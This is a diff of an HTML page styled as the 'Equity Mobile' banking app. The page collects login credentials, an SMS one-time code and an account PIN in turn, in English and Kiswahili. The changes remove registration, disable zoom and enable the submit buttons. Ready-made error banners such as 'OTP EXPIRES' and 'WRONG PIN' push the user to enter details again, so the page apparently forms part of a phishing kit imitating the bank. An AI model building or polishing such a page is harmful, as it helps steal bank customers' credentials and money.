@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Equity Mobile</title>
   <link rel="stylesheet" href="style.css">
 </head>
@@ -10,11 +10,27 @@
 
 <div class="app-container">
 
+  <!-- LANGUAGE MODAL -->
+  <div id="language-modal" class="modal-overlay">
+    <div class="modal-card">
+      <h3 id="lbl-select-lang">Select Language / Chagua Lugha</h3>
+      <div class="lang-option" data-lang="en">
+        <span>🇬🇧 English</span>
+        <span class="check-mark" id="check-en">✓</span>
+      </div>
+      <div class="lang-option" data-lang="sw">
+        <span>🇹🇿 Kiswahili</span>
+        <span class="check-mark" id="check-sw"></span>
+      </div>
+      <button id="btn-close-lang" class="btn-gray-sm">Close / Funga</button>
+    </div>
+  </div>
+
   <!-- SCREEN 1: WELCOMING SCREEN (EQUITY MOBILE SPLASH) -->
   <section id="screen-welcome" class="screen equity-splash-bg active">
     <div class="top-nav-bar">
-      <div class="lang-selector">
-        <span id="welcome-lang-icon">🌐</span>
+      <div class="lang-selector" id="btn-toggle-lang">
+        <span>🌐</span>
         <span id="welcome-lang-text">Eng</span>
         <small>▾</small>
       </div>
@@ -28,12 +44,11 @@
       </div>
 
       <h1 class="splash-title" id="txt-welcome-title">Welcome to Equity mobile</h1>
-      <p class="splash-sub" id="txt-welcome-sub">Good afternoon! Sign in or register to continue</p>
+      <p class="splash-sub" id="txt-welcome-sub">Good afternoon! Sign in to continue</p>
     </div>
 
     <div class="splash-actions">
       <button id="btn-welcome-signin" class="btn-equity-white">Sign in</button>
-      <button id="btn-welcome-register" class="btn-equity-outline">Register</button>
     </div>
   </section>
 
@@ -146,7 +161,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 4: HATUA 3 YA 3 (SUMMARY & CHECK PHOTOS) -->
+  <!-- SCREEN 4: HATUA 3 YA 3 (SUMMARY) -->
   <section id="screen-step3" class="screen">
     <header class="inner-header">
       <button class="back-btn" id="btn-step3-back">←</button>
@@ -209,7 +224,6 @@
       <p id="lbl-login-sub">Sign in to continue. Remember, your password is yours, do not share it with anyone.</p>
     </div>
 
-    <!-- SURFACE ERROR BANNER -->
     <div id="banner-creds-error" class="surface-error-banner">
       INVALID ACC. DETAILS ❌ Please check your email/mobile or password.
     </div>
@@ -246,7 +260,7 @@
     </div>
 
     <div class="login-action-bottom">
-      <button id="btn-submit-login" class="btn-equity-disabled">Sign in</button>
+      <button id="btn-submit-login" class="btn-equity-red">Sign in</button>
     </div>
   </section>
 
@@ -262,7 +276,6 @@
       <p id="lbl-otp-sub">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
     </div>
 
-    <!-- SURFACE ERROR BANNER -->
     <div id="banner-otp-error" class="surface-error-banner">
       OTP EXPIRES ❌ Please enter the new OTP code sent to your phone.
     </div>
@@ -283,7 +296,7 @@
     </div>
 
     <div class="login-action-bottom">
-      <button id="btn-submit-otp" class="btn-equity-disabled">WASILISHA</button>
+      <button id="btn-submit-otp" class="btn-equity-red">WASILISHA</button>
     </div>
   </section>
 
@@ -299,7 +312,6 @@
       <p id="lbl-pin-sub">Weka namba yako ya simu na PIN ya akaunti</p>
     </div>
 
-    <!-- SURFACE ERROR BANNER -->
     <div id="banner-pin-error" class="surface-error-banner">
       WRONG PIN ❌ Incorrect account PIN. Please try again.
     </div>
@@ -330,7 +342,7 @@
     </div>
 
     <div class="login-action-bottom">
-      <button id="btn-submit-pin" class="btn-equity-disabled">INGIA</button>
+      <button id="btn-submit-pin" class="btn-equity-red">INGIA</button>
     </div>
   </section>
 
@@ -368,5 +380,5 @@
 
 <script src="script.js"></script>
 </body>
-          </html>
-                                                     
+  </html>
+                                                      
